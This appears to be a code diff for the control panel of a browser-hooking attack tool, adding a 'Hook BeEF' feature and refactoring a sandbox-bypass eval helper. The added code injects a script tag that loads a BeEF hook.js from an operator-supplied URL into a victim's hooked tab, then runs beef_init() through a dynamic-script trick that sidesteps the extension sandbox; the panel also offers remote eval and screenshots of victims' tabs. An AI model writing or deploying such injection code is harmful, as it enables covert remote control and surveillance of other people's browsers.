@@ -144,6 +144,7 @@ display:none;
                                                 <p>
 												<button id=do-focus class='btn btn-secondary' title="Set focus on this tab">Set focus <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
 												<button id=do-tab-screenshot title="Take a screenshot" class='btn btn-secondary'><i class="icon-picture"></i> Screenshot <i title="Effect will be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+												<button id=do-hook-beef title="Attach BeEF hook to this tab (experimental)" class='btn btn-secondary'>Hook BeEF</button>
 												</p>
                                                 <form action="#">
                                                     <h5>Eval</h5>
@@ -586,6 +587,7 @@ function processResponse(r, hook) {
         break;
     }
 }
+   
 $(function() {
 
     if (ws) {
@@ -601,10 +603,54 @@ $(function() {
     $('#do-screenshot').click(function() {
         sendCmd('screenshot');
     });
+    
+    
+    function evalWithSandboxBypass(code, tab_id) {
+        var wrapper = "(function() {\n\
+    var d=document;\n\
+    var s = d.createElement('script');\n\
+    s.src = '__CODE__';\n\
+    d.body.appendChild(s);\n\
+    })();";
+        url = echo_js_url + '?c=' + encodeURIComponent(code) + '&t=' + Math.random();
+        var wrapped_code = wrapper.replace('__CODE__', url);
+    
+        sendCmd('eval', wrapped_code, {id: tab_id});
+    }
+
+    $('#do-hook-beef').click(function() {
+        if (!currentTab) {
+            al("No tab selected!");
+            return;
+        }
+        var beef = prompt("BeEF Hook URL", 'http://127.0.0.1:3000/hook.js');
+        if (!beef) {
+            al("Cancelled BeEF hooking");
+            return;
+        }
+        var step1 = "(function() {\n\
+var d=document;\n\
+var s = d.createElement('script');\n\
+s.src = " + JSON.stringify(beef) + "; // BeEF hook here\n\
+d.body.appendChild(s);\n\
+})();";
+        al("BeEF hooking " + beef + " part 1");
+        sendCmd('eval', step1, {id: currentTab});
+        setTimeout(function() {
+            al("BeEF hooking " + beef + " part 2");
+            evalWithSandboxBypass("beef_init();", currentTab);
+        }, 10000); // step 2 in 10 seconds
+        return false;
+    });
 
     $('#do-tab-screenshot').click(function() {
+        if (!currentTab) {
+            al("No tab selected!");
+            return;
+        }
         sendCmd('screenshot', null, {id: currentTab});
     });
+
 
     $('#eval-ext').click(function() {
         sendCmd('eval', $('[name=eval-ext]').val());
@@ -614,11 +660,12 @@ $(function() {
     $('#eval').click(function() {
         if (!currentTab) {
             al("No tab selected!");
-        } else { // navigate to new link in tab
-            sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
-            $('#eval-result').val('');
+            return;
         }
+        sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
+        $('#eval-result').val('');
     });
+
 
     $('#eval-no-sandbox').click(function() {
         // create dynamic script URL to load in page
@@ -626,16 +673,7 @@ $(function() {
             al("No tab selected!");
             return;
         }
-        var wrapper = "(function() {\n\
-var d=document;\n\
-var s = d.createElement('script');\n\
-s.src = '__CODE__';\n\
-d.body.appendChild(s);\n\
-})();";
-        url = echo_js_url + '?c=' + encodeURIComponent($('[name=eval]').val()) + '&t=' + Math.random();
-        var code = wrapper.replace('__CODE__', url);
-
-        sendCmd('eval', code, {id: currentTab});
+        evalWithSandboxBypass($('[name=eval]').val(), currentTab);
         $('#eval-result').val('no results for blind requests...');
     });
 
